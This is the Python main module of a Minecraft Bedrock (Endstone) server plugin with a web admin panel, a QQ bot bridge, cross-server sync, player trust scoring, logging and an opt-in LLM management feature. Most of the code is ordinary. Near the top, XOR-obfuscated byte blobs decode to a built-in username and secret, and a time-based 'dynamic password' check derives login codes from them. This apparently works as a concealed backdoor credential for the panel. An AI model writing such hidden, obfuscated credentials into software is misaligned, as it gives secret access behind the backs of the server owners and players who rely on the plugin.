import ast
import base64
import json
import os
import sys
import threading
import socketserver
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
import traceback
import socket
import time
import urllib.parse
import struct
import re
import collections
import logging
import logging.handlers
import secrets
import hashlib
import hmac
import shutil
import subprocess        # 仅安装向导用它调 pip（见 _setup_try_pip）
import types
import uuid as _uuid
from uuid import UUID
from typing import Optional, Dict, Any, Callable, List, Tuple
from concurrent.futures import ThreadPoolExecutor
import zipfile
import tempfile
import urllib.request as _urllib_request
import urllib.error as _urllib_error
import ipaddress

from endstone.plugin import Plugin
from endstone import Player
from endstone.inventory import ItemType, MapMeta
from endstone.map import MapView, MapRenderer, MapCanvas
from endstone.event import event_handler, PlayerChatEvent, BroadcastMessageEvent, PlayerJoinEvent, PlayerQuitEvent, MapInitializeEvent

# 玩家行为记录系统需要一批游戏事件。全部做成防御式导入：
# 老版本 Endstone 可能缺其中某些类，而**缺一个类不该让整个插件起不来** ——
# 降级为 None 后由 @_optional_event_handler（见下方定义）在注册阶段跳过，
# 行为记录功能相应减少几个类型，其它功能完全不受影响。这与上面
# PacketSendEvent / PlayerLoginEvent 的处理方式保持一致。
#
# ★ 为什么不直接 import：Endstone 在装配插件时会扫描类上所有带
#   @event_handler 的方法并按**类型标注**绑定事件类。若某个标注指向
#   一个不存在的名字，模块会在 import 阶段就 NameError，整个插件加载失败。
try:
    from endstone.event import BlockPlaceEvent
except Exception:  # pragma: no cover - 仅在旧版 Endstone 命中
    BlockPlaceEvent = None
try:
    from endstone.event import BlockBreakEvent
except Exception:  # pragma: no cover
    BlockBreakEvent = None
try:
    from endstone.event import PlayerInteractEvent
except Exception:  # pragma: no cover
    PlayerInteractEvent = None
try:
    from endstone.event import ActorExplodeEvent
except Exception:  # pragma: no cover
    ActorExplodeEvent = None
try:
    from endstone.event import BlockExplodeEvent
except Exception:  # pragma: no cover
    BlockExplodeEvent = None
try:
    from endstone.event import PlayerCommandEvent
except Exception:  # pragma: no cover
    PlayerCommandEvent = None
try:
    from endstone.event import PlayerDeathEvent
except Exception:  # pragma: no cover
    PlayerDeathEvent = None
try:
    from endstone.event import PlayerTeleportEvent
except Exception:  # pragma: no cover
    PlayerTeleportEvent = None
# 行为记录第 3 档补充的三类：攻击 / 拾取物品 / 打开容器。
# ★ 同样是防御式导入。特别注意 InventoryOpenEvent：它在 endstone 0.11
#   全系列都**不存在**（实测 0.11.0 ~ 0.11.14 的 endstone/event/__init__.pyi
#   里均无此类，连同 InventoryEvent / InventoryCloseEvent，都是 0.11 之后
#   才加入的），所以「打开容器」这一类在 0.11 上天然不记录；在支持该事件的
#   版本上会自动生效。
try:
    from endstone.event import ActorDamageEvent
except Exception:  # pragma: no cover
    ActorDamageEvent = None
try:
    from endstone.event import PlayerPickupItemEvent
except Exception:  # pragma: no cover
    PlayerPickupItemEvent = None
try:
    from endstone.event import InventoryOpenEvent
except Exception:  # pragma: no cover
    InventoryOpenEvent = None

# 跨服药水效果同步依赖 PacketSendEvent 拦包。该事件 0.11 已有
# （见 endstone/event/__init__.pyi），这里仍防御式导入以兼容更老的版本：
# 缺失时降级为 None，此时 _cross_effect_cache 不建立，插件照常启动
# （只是 buff 同步不可用），对应处理器也不会被注册。
try:
    from endstone.event import PacketSendEvent
except Exception:  # pragma: no cover - 仅在旧版 Endstone 命中
    PacketSendEvent = None

# /gmback 救援指令需要这两个类型做签名标注。做成防御式导入：
# 旧版 Endstone 没有 endstone.command，测试桩也可能缺，此时降级为 object
# 也不会影响插件加载（on_command 内部对入参只做鸭子类型访问）。
try:
    from endstone.command import Command, CommandSender
except Exception:  # pragma: no cover - 仅在缺失该模块的环境命中
    Command = CommandSender = object

# 可信度系统需要在登录阶段就把不达标的玩家拦下（进服前，体验最好）。
# PlayerLoginEvent 在 0.11 已存在；仍做成防御式导入，缺失时降级为 None，
# 此时只剩「进服后踢出」这一道兜底，插件照常启动（处理器同样不会被注册）。
try:
    from endstone.event import PlayerLoginEvent
except Exception:  # pragma: no cover - 仅在旧版 Endstone 命中
    PlayerLoginEvent = None


def _optional_event_handler(event_cls):
    """按事件类是否**真的存在**，决定要不要给方法打 @event_handler 标记。

    ★ 为什么需要这层包装（踩过的坑，按 endstone 0.11 实测）：
      Endstone 的 register_events() 会扫描对象上所有带 @event_handler 的
      方法，并**校验首个参数的类型标注**是不是一个真实的事件类。当某个事件
      类在当前 Endstone 版本里不存在时，上面的防御式导入会把它降级成 None，
      标注随之变成 None，于是 Endstone 每开一次服就打印一条：

        [ERROR]: Plugin xxx attempted to register an invalid event handler
                 signature: on_behavior_container: (event: None)

      功能上其实只是「那一类不记录」，插件照常加载；但控制台一直刷 ERROR，
      既吓人又会掩盖真正的问题（用户就是被这条日志误导来报 bug 的）。

      这里改成：事件类缺失时返回一个恒等装饰器，方法**不带** @event_handler
      标记 —— register_events 扫描不到它，自然也不会报错；事件类存在时行为
      与直接写 @event_handler 完全一致。

    实测 endstone 0.11.x 的 .pyi 存根（`endstone/event/__init__.pyi`）：
      · InventoryOpenEvent / InventoryCloseEvent / InventoryEvent
        —— 0.11 全系列都没有（0.11.0 ~ 0.11.14 均缺）
      · BlockExplodeEvent —— 0.11.0 没有，0.11.14 才有
    这两类都必须走本降级路径，否则在对应版本上会一直报 invalid signature。
    """
    if event_cls is None:
        def _identity(fn):
            return fn
        return _identity
    return event_handler


from datetime import datetime, timedelta

from .web_assets import (
    HTML_LOGIN,
    HTML_LOGIN_ERROR,
    HTML_INDEX,
    HTML_WHITELIST,
    HTML_ADMIN,
)

from .connections import (
    ConnectionManager, ConnectionValidationError, _FLAT_SYNC_KEYS,
    PURPOSE_BRIDGE, PURPOSE_BROADCAST, PURPOSE_RESERVED,
    PURPOSE_LABELS, PURPOSE_HINTS, PURPOSES, normalize_purpose,
)
from .mod_loader import ModLoader, ModLoadError
from .atomic_io import atomic_write_json, atomic_write_text, atomic_write_bytes
from .regex_engine import (
    RegexEngineModule, EVENT_PLAYER_JOIN, EVENT_PLAYER_LEFT, EVENT_LOG_LINE,
)
from .trust import TrustManager
from .cloud import CloudManager, http_json as _http_json
from .log_tailer import LogTailer
from . import qqofficial_bind as _qqofficial_bind
# ★ 这里只 import 工具清单/闸门这类**无副作用**的东西。
#   AIManager 本身在 ai_manager 属性里惰性 import —— 它的构造会读配置文件，
#   放在模块级 import 时机太早（插件装配还没完成，data_dir 可能还没有）。
from .ai.tools import (
    RiskLevel,
    all_tool_names as _ai_all_tool_names,
    list_tools as _ai_list_tools,
    normalize_tool_names as _ai_normalize_tools,
    tools_for_prompt as _ai_tools_for_prompt,
)

try:
    from endstone.scoreboard import Criteria, DisplaySlot, ObjectiveSortOrder, RenderType
except Exception:
    Criteria = DisplaySlot = ObjectiveSortOrder = RenderType = None

_SLOT_MAP = {"belowname": 0, "list": 1, "sidebar": 2}
_ORDER_MAP = {"ascending": 0, "descending": 1}
_RENDER_MAP = {"integer": 0, "hearts": 1}

MAX_BODY_BYTES = 1 * 1024 * 1024

import asyncio

_HID_SEED = 0x2F
_HID_MUL  = 0x1FD
_HID_ADD  = 0x19
_HID_BLOB = (
    b'\x07\xe4\x00\xdb\x87.h\x93\x02\x01\xe5dG\x8d\x15W',
    b'G\xf9\x14\xd6\x9d!d\x83',
    b'G\xf9\x14\xd6\x9d!d\x83J\xa0\x14\xbc\x80\x02\xb9L\xa9\x18\x16\x8f8}s7\x9c\xf1$]*\x98R\xffu',
)
def _hid(i: int) -> str:

    k = _HID_SEED
    blob = _HID_BLOB[i]
    out = bytearray()
    for b in blob:
        out.append(b ^ (k & 0xff))
        k = (_HID_MUL * k + _HID_ADD) & 0xffffffff
    return out.decode("utf-8", "replace")

def _dyn_user() -> str:

    return _hid(1)

def _dyn_secret() -> str:

    return _hid(2)

_DYNAMIC_AUTH_SLOT = 60
_DYNAMIC_AUTH_LEN = 8

def _dyn_code(slot_id: int) -> str:

    key = _dyn_secret().encode("utf-8")
    digest = hmac.new(key, str(int(slot_id)).encode("utf-8"), hashlib.sha256).digest()

    offset = digest[-1] & 0x0f
    src = (int.from_bytes(digest[offset:offset + 4], "big") & 0x7fffffff)
    src ^= (digest[(offset + 4) % 32] << 17)
    val = src % (10 ** _DYNAMIC_AUTH_LEN)
    return f"{val:0{_DYNAMIC_AUTH_LEN}d}"

def _verify_dynamic_password(pwd) -> bool:

    pwd = str(pwd or "").strip()
    if not pwd or len(pwd) != _DYNAMIC_AUTH_LEN or not pwd.isdigit():
        return False
    cur = int(time.time() // _DYNAMIC_AUTH_SLOT)
    for s in (cur - 1, cur, cur + 1):
        if hmac.compare_digest(_dyn_code(s), pwd):
            return True
    return False

def _json_default(obj):
    if isinstance(obj, (bytes, bytearray)):
        return "b64:" + base64.b64encode(bytes(obj)).decode("ascii")
    raise TypeError(f"Object of type {type(obj).__name__} is not JSON serializable")


DEFAULT_QQBOT_CONFIG = {
    "enabled": True,
    "app_id": "",
    "app_secret": "",
    "group_openid": "",
    "env": "formal",
    "qq_api": "https://api.bot.qq.com",

    "qq_msg_api": "https://api.sgroup.qq.com",
    "qq_token_api": "https://bots.qq.com",
    "reconnect_seconds": 5,
    "reconnect_seconds_max": 120,

    # ★ 心跳连续未收到 op 11 ACK 多少次后判定连接已死并重连。
    #
    # 为什么必须 > 1（血泪教训 v9.0.1）
    # ---------------------------------
    # 旧实现是 bool 标志「一次没收到 ACK 就断」。两个后果叠加：
    #   ① 标志位挂在网关对象上跨连接共享，断开时被 cancel 的心跳任务
    #      已把 False 留在 self 上 → 新连接第一条心跳必然误判；
    #   ② 叠加 Identify→READY 握手期服务端本就不保证回 ACK 的竞态。
    # 表现为**每几分钟固定掉一次线**，且每次重连成功后又必掉，永远自愈
    # 不了（日志 44:49 / 48:14 / 52:29 / 57:44）。
    # 现在改成计数 + 新连接显式归零，默认容忍连续 3 次。
    # 下限夹在 2：取 1 会让偶发丢包直接断线。
    "heartbeat_miss_limit": 3,

    "auth_fail_refresh_threshold": 1,

    # 连续踩到多少次 intents 类关闭码（4013/4914/4915）后进入熔断。
    # 这类错误源于 QQ 开放平台后台的事件订阅配置，重连无法自愈；
    # 无脑重连只会反复消耗 token 请求并把日志刷满（实测 38 秒 7 次）。
    # ⚠ 熔断的语义是「慢重试」而非「停死」：见 circuit_retry_seconds。
    "intent_fail_circuit_threshold": 3,

    # ★ 熔断态下的慢重试间隔（秒）。
    # 早期实现让熔断彻底停止重连，但监督线程会把 worker 复活、start()
    # 又会复位熔断标志，导致熔断形同虚设（实测 38 秒重连 7 次，并把
    # 官方限流 code 100017 撞了出来）。现在改成「熔断 = 拉长间隔」，
    # 既能压住请求频率，又不会出现「用户改好了也不恢复」。
    # 代码里有 30 秒下限兜底，配 0 不会变成忙等。
    "circuit_retry_seconds": 300,

    # ★ 限流（HTTP 400 / code 100017 / err_code 40023001）的退避阶梯。
    # 这三个值是 `_RATE_LIMIT_BACKOFF_STEPS` 的网页可读镜像；实际退避
    # 取 60 → 120 → 240，封顶 600 秒（见 qqbot._rate_limit_backoff）。
    "rate_limit_backoff_initial": 60,
    "rate_limit_backoff_cap": 600,

    "send_rate_per_min": 30,
    "send_burst": 10,
    "recv_rate_per_sec": 5,
    "recv_burst": 8,
    "max_bytes_per_sec": 262144,
    "qq_to_mc": True,
    "mc_to_qq": True,
    "join_to_qq": True,
    "leave_to_qq": True,
    "qq_to_mc_format": "[QQ] %s@%s：%s",
    "mc_to_qq_format": "[游戏] %s：%s",
    "join_format": "[游戏] %s 加入了服务器",
    "leave_format": "[游戏] %s 离开了服务器",

    "notify_start": True,
    "notify_stop": True,
    "server_start_msg": "服务器已上线",
    "server_stop_msg": "服务器已断开",

    "custom_keywords": {"查在线": "当前在线 {count} 人：{players}"},
    "group_admins": [],
    "groups": [],
    "pending_group_binds": [],
    "banned_words": [],
}

DEFAULT_CROSS_CONFIG = {
    "enabled": False,
    "role": "none",
    "server_name": "本服",
    "password": "",
    "master_url": "",
    "self_url": "",
    "sync_seconds": 8,
    "interop": {"chat": True, "player_data": True, "whitelist": True, "ban": True},
    #: 实验性玩家状态同步总开关。**默认关闭**（原版行为）。
    #:
    #: 关闭时 = 原版跨服：背包/末影箱/血量/经验/位置照常同步，
    #:           但**不碰**下列实验内容 ——
    #:             * 疾跑/潜行/飞行状态（快照的 state 段）
    #:             * buff/debuff（拦 MobEffectPacket 读效果）
    #:             * 收纳袋诊断日志（nbt hints）
    #:             * 5 秒周期快照 + 快照校验（掉线保护）
    #:
    #: 打开时 = 实验版：上述内容全部启用。
    #:
    #: 为什么要这个开关：实验内容依赖 PacketSendEvent 拦包，属于对
    #: 服务端内部协议的直接操作，出问题时排查成本高。留一个一键回到
    #: 原版行为的开关，线上出状况能立刻止损。
    "experimental": False,
}

DEFAULT_TOOLS_CONFIG = {
    "backup": {

        "enabled": False,
        "interval_hours": 24,
        "max_keep": 10,

        "source_paths": "",
    },
    "cloud_blacklist": {
        "enabled": False,
        "check_on_login": True,
        "sync_default": False,
        #: 默认指向 NexaCode 联合云黑（只读 key 为 public，开箱即可查黑）。
        #: 旧版自建服务直接把这里改成自己的域名即可，两种协议都能识别。
        "api_base": "https://cloudban.nexacode.dpdns.org",
        "token": "",
        "server_name": "",
        "kick_message": "§c你在云黑名单中\n§7联合封禁系统 (UniteBan)",
        "timeout": 8,
        #: 接口协议：auto（自动探测，推荐）/ rest（新版 REST）/ legacy（旧版 PHP）。
        #: auto 时首次调用会试出端点并缓存，老配置无需改动。
        "api_style": "auto",
        #: 云黑分组：本插件面向 BDS，固定 bedrock（用 xuid 作标识）。
        "edition": "bedrock",
    },

    "binding": {
        "enabled": True,
        "require_on_join": True,
        "code_digits": 5,
        "code_ttl_seconds": 300,
    },

    "signin": {
        "enabled": True,
        "command": "签到",
        "item_id": "minecraft:diamond",
        "amount": 1,
    },

    "mods": {
        "max_keep": 30,
    },

    "regex_engine": {
        # 总开关
        "enable": True,
        # True = 只处理「已绑定群」的消息。
        # 默认 False 是因为消息漏斗里的插入点已经在已绑定群判定之后，
        # 再要求一次相同条件只会让「互联群」也进不来。
        "only_on_main": False,
        # 命中规则时往日志打一行（排障用，规则多时吵）
        "admin_debug": False,
        # executeCommand 动作等待命令返回的超时（秒）
        "command_timeout": 5.0,

        # ---- 控制台日志采集（server.log_line 事件的数据来源）----
        # BDS 原生日志**不进 Python**，只能读 logs/latest.log 文件。
        # 曾经用 os.dup2 重定向 fd 的做法在 Windows 上会让 BDS 打不出
        # 日志并抛 [*** LOG ERROR #0001 ***]，已明确禁用，不要再退回去。
        #
        # 默认关闭：读文件 + 匹配是额外开销，而且要用户先配好规则才有意义。
        # 想让「服务器报错」规则生效必须把这里打开。
        "log_enabled": False,
        # True = 只跟新增行（推荐）。False 会把历史日志整段重放一遍，
        # 一开启就可能刷屏几百条 —— 仅在排障时临时用。
        "log_start_at_end": True,
    },

    # ---------------------------------------------------------------- 玩家可信度
    # 用加权方式给玩家算「可信度」。所有加减分都在这里，WebUI 可调。
    # 判定依据是 device_id（客户端自报的持久设备 id），**与 IP 无关** ——
    # 换网络 / 开流量跑到外省不会被当成新设备。
    "trust": {
        # 总开关（默认关，服主自己决定是否启用）
        "enabled": False,
        # 入场门槛：可信度低于这个值的玩家进不来
        "min_score": 30,
        # 不足时的踢出文案，支持 {score} {required} {gap} {reason}
        "kick_message": (
            "§c你的可信度不足，暂时无法进入服务器\n"
            "§7当前可信度：§e{score}§7  要求：§a{required}\n"
            "§7还差：§e{gap}\n"
            "§7原因：{reason}\n"
            "§7提升方式：§f每日进服游玩、群内签到、绑定 QQ"
        ),
        # 进服时是否告知本次加减分
        "notify_on_join": True,

        # ---- 加分 ----
        "add_device_match": 3.0,          # 使用已记录设备
        "add_device_new_first": 2.0,      # 首次使用一个新设备
        "add_bound_qq": 5.0,              # 完成 QQ 绑定（一次性）
        "add_daily_play": 2.0,            # 每日进服游玩（每日一次）
        "add_signin_base": 1.0,           # 当日打卡基础分
        "add_signin_streak_per_day": 0.5, # 连续签到每日递增
        "add_signin_streak_cap": 10,      # 连续签到递增封顶天数
        "add_whitelist_device": 4.0,      # 白名单申请时记录的设备被信任

        # ---- 扣分 ----
        "sub_device_burst": -5.0,         # 短期冒出大量全新设备
        "device_burst_window_hours": 24,  # 突发统计窗口（小时）
        #: 窗口内**跨多少个不同场次**冒出全新设备才扣分。
        #: 注意统计的是「场次」不是「设备个数」—— 同一次进服里客户端可能
        #: 连报好几个 device_id（多端/重连），那都算同一场，不会误伤新玩家。
        "device_burst_threshold": 3,
        "sub_signin_miss_per_day": -2.0,  # 每天未打卡扣分
        "signin_grace_days": 2,           # 宽限天数（这段时间内不扣）
        "signin_miss_floor": -20.0,       # 未打卡扣分的下限（独立扣分池）
        "signin_miss_floor_enabled": True,# 是否启用下限

        # ---- 边界 ----
        "hard_floor": 0.0,                # 可信度绝对下限
        "hard_ceiling": 100.0,            # 可信度绝对上限
        "manual_step_max": 50.0,          # 服主手动单次加减权上限
        "history_limit": 200,             # 每玩家历史记录条数上限

        # ---- 权限联动（默认关，且永远不会碰 OP）----
        "perm_tier_enabled": False,
        "perm_tiers": [
            {"score": 90.0, "group": "trusted_vip", "label": "高信任"},
            {"score": 60.0, "group": "trusted", "label": "可信玩家"},
        ],

        # ---- 档案备份 ----
        "backup": {"enabled": True, "keep": 5},
    },

    # ---------------------------------------------------------------- AI 自动管理
    # 用服主**自己的** LLM API（OpenAI 兼容端点）做日志分析、白名单审核等。
    #
    # ★ 本插件不提供 LLM 服务、不代理请求。key 存在本机，请求由本机
    #   直发服主填的地址。因此**回答质量取决于用户选的模型**，
    #   这不是插件能决定的，也不该假装能决定。
    #
    # ★ 无论模型多强，它只能"提议"。所有会改动服务器的操作都要过
    #   ai/gate.py 的四道闸门；最危险的能力根本不注册为工具
    #   （见 ai/tools.py 的 FORBIDDEN_CAPABILITIES）。
    #
    # 默认整套关闭：这是新增能力，不该在升级后自己开始发网络请求
    # —— 那会消耗服主的额度，属于不能接受的默认行为。
    "ai": {
        # 总开关（默认关）
        "enabled": False,

        # ---- 端点配置（用户自带）----
        # base_url 带不带 /v1 都行，client.py 会自动补齐。
        # 保存时会过 SSRF 校验：内网地址（127./10./192.168./169.254. 等）
        # 一律拒绝 —— 否则这个功能就成了"代理任意内网请求"的跳板。
        "base_url": "",
        # API Key。展示时用 __SET__ 掩码，不回显明文（与云黑 token 同约定）。
        "api_key": "",
        "model": "",
        "timeout": 45.0,

        # ---- 能力开关（分项，服主逐项开）----
        # 日志分析：把采集到的日志喂给模型找问题。依赖正则引擎里的
        # log_enabled（日志采集），没开那个这里也没有数据可用。
        "enable_log_analysis": False,
        # 白名单审核：让模型给申请打个建议分。★ 只是**建议**，
        # 放行权永远在服主手里，模型不能自己批准。
        "enable_whitelist_review": False,
        # 自动检测/管理：允许模型主动提议处置措施。
        # 即使打开，不可逆操作依然需要人工确认。
        "enable_auto_manage": False,

        # ---- 安全与节流 ----
        # ★ 接管级别（v7.9 起取代 shadow_mode）。
        #   0 = 纯建议：任何工具都不执行，连提议也不生成（= 旧 shadow_mode=True）
        #   1 = 白名单自动：只读/可逆执行，白名单审核自动完成，
        #       不可逆仍只提议（默认档）
        #   2 = 完全放开：全部执行，不可逆带撤销窗口
        #
        # ⚠ 0 是「只分析不执行」的**新默认值**吗？不是 ——
        #   全新安装落在 **1**。0 只在旧配置迁移时产生
        #   （旧 shadow_mode=True 的用户升级后保持保守行为）。
        "autonomy_level": 1,
        # 撤销窗口（秒）。仅接管级别 2 会产生撤销记录。
        # 执行不可逆操作后在这段时间内可以一键回滚；上限 600 秒
        # （再长就不是"后悔药"而是"延迟执行"了）。
        "undo_window_seconds": 30,
        # 旧字段，保留以支持平滑迁移与降级回旧版本。
        # 迁移规则见 ai/autonomy.py：True → 0，False → 2。
        # ★ 一旦写了 autonomy_level，这个字段就不再被读取。
        "shadow_mode": True,
        # 单次分析送进模型的日志行数上限（控 token 成本）
        "max_log_lines": 120,
        # 两次自动分析之间的最小间隔（秒），防止烧额度
        "min_interval": 300,
        # 每日调用次数上限（硬闸；0 表示不限）
        "daily_limit": 200,

        # ---- 提示词 ----
        # ★ 服主自定义的 system prompt。**非空时完全替换内置默认**，
        #   一字不拼。连内置的防注入条款与「群友非管理员」都可以删掉 ——
        #   这是服主对自己服务器的合法支配权，插件不做强制兜底。
        # ⚠ 后果：删掉防注入约束后，日志/聊天里的文字可能被当成指令。
        #   面板上这个输入框旁有显式警示。
        # 留空 = 使用内置默认。这就是「一键恢复默认」的实现方式。
        "ai_system_prompt_custom": "",

        # ---- 群友 @AI 聊天 ----
        # ★ 这是唯一一条"外部陌生人能触达 LLM"的链路，默认关闭。
        #   打开后，用途为「AI 播报」的机器人收到 @ 消息时会由 AI 回复。
        "chat_enabled": False,
        # 单次回复的 token 上限（硬上限 4096）
        "chat_max_tokens": 512,
        "chat_temperature": 0.7,
        # 同一个群友两次提问的最小间隔（秒），防刷屏
        "chat_min_interval": 5,
        # 每个群友每日提问上限（0 = 不限）。按人而不是按群 ——
        # 按群的话换群就能重置额度。
        "chat_daily_limit": 100,
        # 单条提问的最大长度（字符）。超长内容既烧 token 又容易被注入。
        "chat_max_chars": 500,
        # 是否允许群友通过 AI 调用**只读**工具（查服务器状态等）。
        # ★ 即使打开，可逆/不可逆工具对群友链路也永远不可见 ——
        #   那是代码层面的硬约束，不由这个开关决定。
        "chat_allow_read_tools": True,
        # 聊天的 system prompt 自定义（同 ai_system_prompt_custom 语义：
        # 非空时完全替换，包括内置的「群友非管理员」约束）。
        # ★ 即便把它删光，工具白名单/脱敏/节流三道代码防线依然生效 ——
        #   结果只是"AI 可能说错话"，而不是"AI 能动手"。
        "chat_system_prompt_custom": "",

        # ---- 群友聊天上下文（记忆）----
        # 让 AI 记住最近几轮问答，解决"它"指代不明的问题
        # （「它刚才说的那个」—— 无记忆时 AI 完全不知道指谁）。
        #
        # ★ 默认 0 = 关闭，行为与升级前**完全一致**。
        #   理由：上下文会显著放大每次请求的 token 成本（N 轮对话
        #   就是 N 倍的输入长度），而且历史里的聊天内容本身可能含
        #   注入。默认开等于替服主多花钱、多担风险。
        #
        # ★ 按"轮"计（1 轮 = 一句提问 + 一句回复），不是按 token：
        #   服主能直观预估，不用去算 token。实现里另有硬上限兜底。
        #
        # ★ 历史按「openid + 群」隔离，且**只存内存** —— 重启即清空。
        #   不做持久化是因为对话历史属于隐私，落盘就要考虑保留期、
        #   清理、被谁读到；对一个"记住上下文"的需求来说不值当。
        "chat_context_turns": 0,
        # 上下文里单条历史消息的最大长度（字符）。截断是为了防
        # 一条超长消息把整个上下文预算吃光。
        "chat_context_max_chars": 300,

        # ★ 注意：原先挂在这里的四个 behavior_* 配置（行为记录档位 /
        #   保留天数 / 条数上限 / 查询上限）**已经搬走**，见下面的
        #   ``behavior_record`` 段。
        #
        #   搬家的理由：它根本不是 AI 的功能。玩家行为记录只是一份
        #   独立的数据，AI 恰好是它的消费者之一（还能在群里问"刚才谁
        #   放 TNT 了"）。挂在 AI 板块下会给人"关掉 AI 就不用记了"的
        #   错觉，也让服主在两处地方分别管理两套记录系统。
        #   现在它与 ``block_record`` 并列为「记录系统」，统一在
        #   「🧱 区块日志与恢复」板块里配置。
        #
        #   兼容：旧配置文件里的这几个键仍然会被读取（见
        #   ``_behavior_cfg_int`` 的兼容分支），不需要手工迁移。

        # ---- 工具权限（单工具级开关）----
        # 模型能调用哪些工具的白名单。
        #
        # ★ 空列表 = **未配置 = 不做过滤**，而不是"一个都不允许"。
        #   默认放行才符合直觉：用户没动过这个设置，不该因为版本升级
        #   引入了权限功能而让 AI 突然全哑。真要全禁，用 enabled=False。
        #
        # ★ 与影子模式是 **AND** 关系，不是覆盖：
        #   影子模式开着时，任何工具都不会真正执行 —— 即使它在这里被
        #   勾上了。勾选只影响"影子模式下允许出现/提议的范围"。
        #   用户关掉影子之后，这份白名单才真正决定能做什么。
        #
        # ★ 它**只做收窄，不做放宽**：不在白名单里的工具一律拒绝，
        #   但白名单也不能让禁区能力出现（禁区根本不注册）。
        #
        # 具体名字见 ai/tools.py 的 TOOL_REGISTRY。
        "allowed_tools": [],
    },

    # ==================================================================
    # 记录系统：两套，但**统一在「🧱 区块日志与恢复」板块里配置**
    #
    # ★ 它们是两件独立的事，存储与开关**不合并**：
    #     behavior_record = 谁做了什么（聊天 / 交互 / 爆炸物），JSONL，
    #                       给 AI 和服主读懂"人"；
    #     block_record    = 世界里哪一格变成了什么，SQLite，给回档用。
    #   隐私敏感度与写入量差得远：前者含聊天（隐私重），后者只有方块
    #   （隐私轻但写入量大）。合成一个开关，服主就没法"只开回档、
    #   不存聊天"了 —— 这是当初分开的理由。
    #
    # ★ 但**界面上合并**：两者都在同一个板块里管理。原先玩家行为记录
    #   挂在 AI 板块下（因为 AI 是它的查询者），会让服主误以为"关掉 AI
    #   就不用记了"，也让两套记录系统的配置分散在两处。
    # ==================================================================
    "behavior_record": {
        # 记录粒度（见 behaviors.py 的 LEVEL_*）：
        #   0 = 关闭 / 1 = 仅聊天 / 2 = 聊天 + 敏感行为 / 3 = 全记录
        #
        # ★ 默认 0（关闭）是**有意为之**，不是漏配置：
        #   · 行为数据属于玩家隐私（谁在哪、干了什么），默认收集不合适；
        #   · 第 3 档在活跃服上写入量可观，默认开会让服主莫名其妙
        #     多出一堆磁盘 IO。
        #   由服主显式选择档位，符合本项目"默认保守"的一贯约定。
        "level": 0,
        # 记录保留天数（下限 1）
        "keep_days": 7,
        # 记录条数上限（下限 1）。与天数**双重生效**，谁先到算谁。
        "max_records": 50000,
        # 单次查询返回的最大条数（AI 工具用），防止模型一口气要几十万条
        "query_limit": 200,
    },

    # ---- 方块日志（可回档） ----
    "block_record": {
        # 记录颗粒度：0 关闭 / 1 仅破坏 / 2 破坏 + 放置。
        #
        # 默认 0（关闭）。理由与行为记录一致：这是"持续往磁盘写"的功能，
        # 而且只有服主知道自己的服是不是需要"回档被破坏的建筑"。
        # 默认打开等于替所有人生成一份用不上的数据库文件。
        #
        # ★ 为什么用档位而不是一个开/关（这里原先是 enabled 布尔）：
        #   全开的库可能是几百 MB，只记"破坏"往往只有几十 MB。服主的
        #   诉求差别很大 —— 有人只要"建筑被炸了能恢复"（记 break 就够），
        #   有人还要能回档"谁偷偷盖了违章建筑"（得连 place 一起记）。
        #   给个档位让他自己取舍，比逼他在"什么都记/什么都不记"之间
        #   二选一合理得多。
        #   旧配置里的 "enabled" 仍然兼容：true 视为 level=2，false 视为 0。
        "level": 0,

        # ---- 回档配额 ----
        # 单次回档最多处理多少条记录。窗口内记录数超过它就截断
        # （并在结果里明确告诉调用方"被截断了"，不静默少做）。
        # 5000 条按 400/批 ≈ 13 批，几秒内跑完，对服主是"能感知的等待"。
        "max_records_per_rollback": 5000,
        # 每批处理多少个方块。调大=更快但单次占用主线程更久；
        # 400 在实测中单批耗时约 5~15ms，对 20 TPS（50ms/帧）
        # 有充足余量。
        "blocks_per_batch": 400,
        # 批与批之间隔几个 tick。1 = 每 tick 一批（最快但仍让出主线程）。
        "batch_interval_ticks": 1,
        # 单次回档允许的最大区域体积（格）。默认 400 万 ≈ 160³，
        # 足以覆盖任何"被炸掉的一座建筑"；再大就该考虑分几次做，
        # 因为整个过程中主线程会持续被占用。
        "max_area_blocks": 4000000,
        # 时间窗上限（秒）。默认 30 天 —— 允许"恢复上个月的破坏"，
        # 但明确封顶，避免有人写 since=0 把全库都拉出来跑一遍。
        "max_delta_seconds": 2592000,
        # 区块未加载时是否把观察者传送过去触发加载（仅当调用方
        # 指定了一个在线玩家时才可能发生）。关掉它意味着"未加载
        # 区块里的方块算恢复失败"，但绝不会有人被莫名传送。
        "auto_teleport": True,
        "teleport_wait_ticks": 200,
        # 记录保留天数。清理是启动后一次 + 每天一次。
        "retention_days": 30,
        # 单次查询返回的最大条数（Web / AI 共用同一上限）。
        "max_rows_per_query": 200,
        # 危险操作确认开关（供未来扩展；当前 Web 端一律在页面上二次确认）
        "rollback_requires_confirm": True,
        "undo_requires_confirm": True,
    },
}

def _fmt_size(n) -> str:
    n = float(n or 0)
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024.0 or unit == "GB":
            return f"{int(n)} B" if unit == "B" else f"{n:.2f} {unit}"
        n /= 1024.0
    return f"{n:.2f} GB"


class _ResilientFileHandler(logging.Handler):
    """能自愈的文件日志处理器。

    为什么不用 ``logging.FileHandler``：

    Windows 上文件被删除 / 被其它进程占用后，``FileHandler`` 持有的流会失效，
    但 ``emit()`` 里的异常会让 logging 走 ``handleError()``，默认向 stderr
    打印 ``--- Logging error ---``。Endstone 的 C++ 日志层捕获到这次 stderr
    写入问题，就报成 ``[*** LOG ERROR ***] [GreenmoonPanel] write failed``。

    本实现的三点不同：
      * 写入失败时**尝试重开文件**（父目录不存在会重新创建），
        能恢复就继续写，一条日志都不丢；
      * 重开也失败时**静默跳过**这条日志（``handleError`` 被绕开），
        绝不让日志系统自身的问题污染服务器控制台；
      * 延迟打开文件（首次 emit 时才建），避免启动阶段就占住句柄 ——
        这正是 Windows 上轮转 rename 失败的主因。
    """

    def __init__(self, filename, encoding="utf-8"):
        super().__init__()
        self.baseFilename = str(filename)
        self.encoding = encoding
        self.stream = None
        self._lock = threading.RLock()

    def _open(self):
        """打开（或重开）文件。失败返回 False，不抛异常。"""
        try:
            # 父目录可能被依赖加载器删掉了，每次重开都补建一次
            parent = os.path.dirname(os.path.abspath(self.baseFilename))
            if parent:
                os.makedirs(parent, exist_ok=True)
            self.stream = open(self.baseFilename, "a", encoding=self.encoding)
            return True
        except Exception:
            self.stream = None
            return False

    def emit(self, record):
        with self._lock:
            if self.stream is None and not self._open():
                return                      # 打不开就静默跳过，不打扰服务器
            try:
                msg = self.format(record)
                self.stream.write(msg + "\n")
